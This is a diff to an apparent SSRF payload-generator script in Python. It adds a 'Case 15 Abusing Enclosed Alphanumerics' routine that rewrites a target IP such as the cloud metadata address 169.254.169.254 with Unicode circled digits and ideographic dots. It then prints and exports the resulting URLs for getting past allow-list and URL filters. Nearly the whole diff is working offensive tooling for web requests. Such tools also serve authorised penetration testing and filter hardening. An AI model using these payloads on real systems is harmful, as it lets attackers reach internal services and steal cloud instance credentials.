@@ -9,6 +9,39 @@ import string
 import os
 import sys
 import platform
+import random
+
+EnclosedAlphanumericsData = {
+	'0' : ['⓪'],
+	'1' : ['①'],
+	'2' : ['②'],
+	'3' : ['③'],
+	'4' : ['④'],
+	'5' : ['⑤'],
+	'6' : ['⑥'],
+	'7' : ['⑦'],
+	'8' : ['⑧'],
+	'9' : ['⑨'],
+	'10' : ['⑩'],
+	'11' : ['⑪'],
+	'12' : ['⑫'],
+	'13' : ['⑬'],
+	'14' : ['⑭'],
+	'15' : ['⑮'],
+	'16' : ['⑯'],
+	'17' : ['⑰'],
+	'18' : ['⑱'],
+	'19' : ['⑲'],
+	'20' : ['⑳'],
+	'.' : ['。','｡'],
+	'a' : ['ⓐ'],
+	'b' : ['ⓑ'],
+	'c' : ['ⓒ'],
+	'd' : ['ⓓ'],
+	'e' : ['ⓔ'],
+	'f' : ['ⓕ'],
+	'x' : ['ⓧ'],
+}
 
 def RANDOM_TEXT_SPEC():
 	min_char = 12
@@ -49,6 +82,42 @@ def validIP(address):
 		print("\nUsage: python "+sys.argv[0]+" IP EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254\nUsage: python "+sys.argv[0]+" 169.254.169.254 export")
 		exit(1)
 	return True
+
+def plain2EnclosedAlphanumericsChar(s0):
+	if s0 not in EnclosedAlphanumericsData:
+		raise Exception('value not found')
+	return random.choice(EnclosedAlphanumericsData[s0])
+
+def convertIP2EnclosedAlphanumericsValue():
+	IPAddressParts4EnclosedAlphanumerics = arg1.split(".")
+	returnEnclosedAlphanumericsIPAddress = ""
+	for x in range(0,4):
+		if len(IPAddressParts4EnclosedAlphanumerics[x]) == 3 and (int(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1])) <= 20 and (int(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1]+IPAddressParts4EnclosedAlphanumerics[x][2])) >= 10:
+			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1]);
+			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][2]);
+			if x <= 2:
+				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar('.');
+		else:
+			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][0]);
+			if len(IPAddressParts4EnclosedAlphanumerics[x]) >= 2:
+				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][1]);
+			if len(IPAddressParts4EnclosedAlphanumerics[x]) == 3:
+				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][2]);
+			if x <= 2:
+				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar('.');
+	return returnEnclosedAlphanumericsIPAddress
+
+def convert(s, recurse_chunks=True, error_on_miss=False):
+		if s in EnclosedAlphanumericsData:
+			return random.choice(EnclosedAlphanumericsData[s])
+		if recurse_chunks and len(s) > 1:
+			return convert(s[:-1]) + convert(s[-1])
+		if error_on_miss:
+			raise Exception('Value not found: %s' % s)
+		return s
+
+def convert_ip(ip, sep='.'):
+	return convert(sep).join([convert(chunk) for chunk in ip.split(sep)])
 
 if len(sys.argv) < 4 or len(sys.argv) >= 6:
 	print("\nUsage: python "+sys.argv[0]+" IP PORT WhiteListedDomain EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com export")
@@ -667,6 +736,39 @@ print("\n",sep='')
 if EXPORTRESULTS == 'export':
 	print('http://',IPAddressParts[0],'。',IPAddressParts[1],'。',IPAddressParts[2],'。',IPAddressParts[3],'/',file=f,sep='')
 	print('http://',IPAddressParts[0],'｡',IPAddressParts[1],'｡',IPAddressParts[2],'｡',IPAddressParts[3],'/',file=f,sep='')
+
+#Case 15 Abusing Enclosed Alphanumerics
+print(bluecolor,"Abusing Enclosed Alphanumerics:",resetcolor," ",yellowcolor,'http://',convertIP2EnclosedAlphanumericsValue(), resetcolor,'        -> ',yellowcolor,"http://",arg1,resetcolor,sep='')
+print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
+print('http://',convertIP2EnclosedAlphanumericsValue(),'/',sep='')
+print('http://',convert_ip(IP1),':',PORT,'/',sep='')
+print('http://',convert_ip(IP2),':',PORT,'/',sep='')
+print('http://',convert_ip(IP3),':',PORT,'/',sep='')
+print('http://',convert_ip(IP4),':',PORT,'/',sep='')
+print('http://',convert_ip(IP5),':',PORT,'/',sep='')
+print('http://',convert_ip(IP6),':',PORT,'/',sep='')
+print('http://',convert_ip(IP7),':',PORT,'/',sep='')
+print('http://',convert_ip(IP8),':',PORT,'/',sep='')
+print('http://',convert_ip(IP9),':',PORT,'/',sep='')
+print('http://',convert_ip(IP10),':',PORT,'/',sep='')
+print('http://',convert_ip(IP11),':',PORT,'/',sep='')
+print('http://',convert_ip(IP12),':',PORT,'/',sep='')
+print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
+print("\n",sep='')
+if EXPORTRESULTS == 'export':
+	print('http://',convertIP2EnclosedAlphanumericsValue(),'/',file=f,sep='')
+	print('http://',convert_ip(IP1),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP2),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP3),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP4),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP5),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP6),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP7),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP8),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP9),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP10),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP11),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP12),':',PORT,'/',file=f,sep='')
 
 if EXPORTRESULTS == 'export':
 	f.close()
